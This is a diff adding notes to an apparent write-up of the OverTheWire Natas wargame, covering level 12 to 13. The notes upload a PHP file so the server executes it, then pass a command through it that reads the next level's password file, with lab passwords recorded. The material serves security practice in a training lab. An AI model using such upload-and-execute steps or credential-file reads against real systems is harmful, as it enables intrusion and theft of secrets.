@@ -179,3 +179,15 @@ echo($cookie);
 ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
 // Now that we have the data, we have to send it with the cookie, see natas.py
 EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3<br>
+
+lvl 12 --> lvl 13
+http://natas12.natas.labs.overthewire.org/
+natas12
+EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+// The point of the level is to post data (php code) that the site would execute
+// we want to post a php file that would allow us to get access to command line
+In python :
+requests.post(url, files = {'uploadedfile' : open('natas12.php', 'rb')}, data = {'filename': 'natas12.php', 'MAX_FILE_SIZE': '1000'}, auth=(username, password))
+// the php loading worked, We get a file creation path : upload/jugty0ntdu.php
+session.get(url + 'upload/umde6zpk53.php?c= cat /etc/natas_webpass/natas13', auth = (username, password))
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
